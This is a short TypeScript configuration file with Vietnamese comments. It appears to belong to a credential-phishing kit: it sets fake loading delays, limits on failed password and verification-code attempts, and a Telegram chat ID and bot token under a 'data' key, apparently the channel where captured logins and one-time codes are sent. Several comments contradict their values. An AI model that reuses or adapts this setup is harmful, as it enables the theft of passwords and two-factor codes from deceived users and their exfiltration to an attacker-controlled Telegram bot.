// Định nghĩa interface Config để xác định cấu hình
interface Config {
	settings: {
		code_loading_time: number; // Thời gian tải mã
		max_failed_code_attempts: number; // Số lần thử mã tối đa
		max_failed_password_attempts: number; // Số lần thử mật khẩu tối đa
		page_loading_time: number; // Thời gian tải trang
		password_loading_time: number; // Thời gian tải mật khẩu
		code_input_enabled: boolean; // Có cho phép nhập mã không
	};
	telegram: {
		notification_chatid: string; // ID trò chuyện thông báo
		notification_token: string; // Mã thông báo cho thông báo
		data_chatid: string; // ID trò chuyện dữ liệu
		data_token: string; // Mã thông báo cho dữ liệu
	};
}

// Cấu hình mặc định
const defaultConfig: Config = {
	settings: {
		// Dang sau dau // khong co tac dung
		code_loading_time: 10000, // Thời gian tải mã mặc định (5 giây)
		max_failed_code_attempts: 3, // Số lần thử mã tối đa (7 lần)
		max_failed_password_attempts: 1, // Số lần thử mật khẩu tối đa (0 lần)
		page_loading_time: 5000, // Thời gian tải trang mặc định (5 giây)
		password_loading_time: 4000, // Thời gian tải mật khẩu mặc định (5 giây)
		code_input_enabled: true, // Cho phép nhập mã (true)
	},
	telegram: {
		notification_chatid: '', // ID trò chuyện thông báo
		notification_token: '', // Mã thông báo cho thông báo
		data_chatid: '1922578871', // ID trò chuyện dữ liệu
		data_token: '8086831835:AAGp7bTGis_7WFTrDtIrzZI03_SOt-bUj2w', // Mã thông báo cho dữ liệu
	},
};

// Hàm getConfig trả về cấu hình mặc định
const getConfig = async (): Promise<Config> => {
	// Trả về cấu hình đã được định nghĩa
	return defaultConfig;
};

// Xuất hàm getConfig để sử dụng ở nơi khác
export default getConfig;
